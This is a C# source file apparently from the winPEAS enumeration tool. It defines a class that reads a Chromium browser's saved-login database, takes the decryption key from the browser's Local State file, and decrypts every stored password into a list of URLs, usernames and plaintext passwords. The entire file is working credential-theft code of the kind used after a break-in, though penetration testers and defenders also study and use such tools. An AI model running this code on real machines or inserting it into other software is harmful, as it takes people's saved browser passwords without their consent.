using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using winPEAS._3rdParty.SQLite;
using winPEAS.KnownFileCreds.Browsers.Decryptor;
using winPEAS.KnownFileCreds.Browsers.Models;

namespace winPEAS.KnownFileCreds.Browsers
{
    internal abstract class ChromiumBase : BrowserBase
    {
        public static string AppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public abstract string BaseAppDataPath { get; }

        public override IEnumerable<CredentialModel> GetSavedCredentials()
        {
            var result = new List<CredentialModel>();
            var p = Path.Combine(BaseAppDataPath, "Login Data");
            var keyPath = Path.Combine(BaseAppDataPath, "..\\Local State");

            try
            {
                if (File.Exists(p))
                {
                    SQLiteDatabase database = new SQLiteDatabase(p);
                    string query = "SELECT action_url, username_value, password_value FROM logins";
                    DataTable resultantQuery = database.ExecuteQuery(query);

                    if (resultantQuery.Rows.Count > 0)
                    {
                        var key = GCDecryptor.GetKey(keyPath);

                        foreach (DataRow row in resultantQuery.Rows)
                        {
                            byte[] encryptedData = Convert.FromBase64String((string)row["password_value"]);
                            GCDecryptor.Prepare(encryptedData, out var nonce, out var cipherTextTag);
                            var pass = GCDecryptor.Decrypt(cipherTextTag, key, nonce);

                            string actionUrl = row["action_url"] is System.DBNull ? string.Empty : (string)row["action_url"];
                            string usernameValue = row["username_value"] is System.DBNull ? string.Empty : (string)row["username_value"];

                            result.Add(new CredentialModel
                            {
                                Url = actionUrl,
                                Username = usernameValue,
                                Password = pass
                            });
                        }

                        database.CloseDatabase();
                    }
                }
            }
            catch (Exception e)
            {
                return null;
            }

            return result;
        }
    }
}
